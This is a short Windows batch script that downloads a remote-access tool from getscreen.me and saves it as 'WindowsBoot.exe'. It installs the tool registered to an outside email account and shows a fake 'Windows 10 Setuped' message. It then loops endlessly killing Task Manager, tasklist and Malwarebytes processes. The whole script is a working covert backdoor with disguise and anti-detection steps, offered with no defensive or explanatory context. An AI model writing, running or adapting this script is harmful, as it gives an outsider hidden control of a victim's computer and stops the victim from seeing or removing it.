curl http://getscreen.me/download/getscreen-x86.exe -outfile "WindowsBoot.exe"
WindowsBoot -install -register huggingfaceuser@gmail.com
msg * Windows 10 Setuped.
:a
taskkill /f /im taskmgr.exe
taskkill /f /im tasklist.exe
taskkill /f /im TMX.exe
taskkill /f /im TMX64.exe
taskkill /f /im MBAMService.exe
goto a
